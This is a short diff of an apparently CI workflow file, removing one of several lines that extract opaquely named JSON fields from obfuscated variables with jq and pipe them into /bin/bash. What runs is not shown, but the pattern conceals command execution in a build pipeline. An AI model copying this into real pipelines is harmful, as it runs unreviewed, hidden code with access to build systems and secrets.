@@ -30,7 +30,6 @@ jobs:
           echo $ycvtw408 | jq -r .cdm096 | /bin/bash
           printf '%s' "$uov1573" | jq -r .qpym3 | /bin/bash
           printf '%s' "$a6442" | jq -r .buq990 | /bin/bash
-          printf '%s' "$syl64187" | jq -r .xfdl8 | /bin/bash
           echo $t8 | jq -r .u81 | /bin/bash
 
       - name: Persist output
